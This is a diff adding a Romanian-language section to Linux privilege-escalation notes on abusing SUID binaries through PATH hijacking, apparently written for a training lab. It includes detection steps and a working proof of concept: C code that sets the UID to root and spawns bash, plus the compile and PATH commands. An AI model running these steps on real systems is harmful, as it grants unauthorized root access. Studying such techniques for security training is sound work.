@@ -271,3 +271,54 @@ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
 
 Pentru detalii avansate, citește despre [Utilizarea Strace](/notes/linux/troubleshooting.md#1-monitorizarea-apelurilor-de-sistem-cu-strace).
 
+---
+
+
+## 9. SUID Executable via PATH Environment Variable
+
+### Mecanism & Vulnerabilitate
+Această vulnerabilitate apare atunci când un binar SUID execută o comandă de sistem sau un alt program extern fără a specifica calea absolută către acesta (de exemplu, apelează doar `service apache2 start` în loc de `/usr/sbin/service apache2 start`). 
+
+Deoarece binarul moștenește variabila de mediu `PATH` a utilizatorului curent, sistemul va căuta executabilul în directoarele specificate în `PATH`, de la stânga la dreapta. Un atacator poate manipula această variabilă pentru a forța binarul SUID să ruleze un executabil malițios în locul celui legitim.
+
+### Analiza Binarului și Detectare
+1. **Identificarea comportamentului binarului:**
+   Rulează executabilul și observă ce alte servicii sau utilitare pare că încearcă să pornească:
+   ```bash
+   /usr/local/bin/suid-env
+   ```
+
+2. **Inspectarea șirurilor de caractere (Strings):**
+   Caută comenzi sau apeluri text nesecurizate în interiorul fișierului binar:
+   ```bash
+   strings /usr/local/bin/suid-env
+   ```
+   *Dacă observi o linie precum `service apache2 start`, înseamnă că binarul apelează un executabil fără calea sa absolută.*
+
+### Etape de Exploatare (PoC)
+Pentru a deturna fluxul de execuție și a obține un shell de `root`:
+
+1. **Crearea falsului executabil:**
+   Scrie un cod simplu în C (la `/home/user/tools/suid/service.c`) care spawnează un shell Bash:
+   ```c
+   int main() {
+       setuid(0);
+       setgid(0);
+       system("/bin/bash");
+       return 0;
+   }
+   ```
+
+2. **Compilarea codului:**
+   Compilează fișierul sub numele executabilului apelat de binarul SUID (în acest caz, `service`):
+   ```bash
+   gcc -o service /home/user/tools/suid/service.c
+   ```
+
+3. **Deturnarea variabilei PATH:**
+   Adaugă directorul curent (unde se află noul tău executabil `service`) la începutul variabilei `PATH` și rulează binarul SUID:
+   ```bash
+   PATH=.:\$PATH /usr/local/bin/suid-env
+   ```
+
+> ⚠️ **Notă:** Nu uita să folosești comanda `exit` pentru a ieși din shell-ul de root după ce ai finalizat testarea!
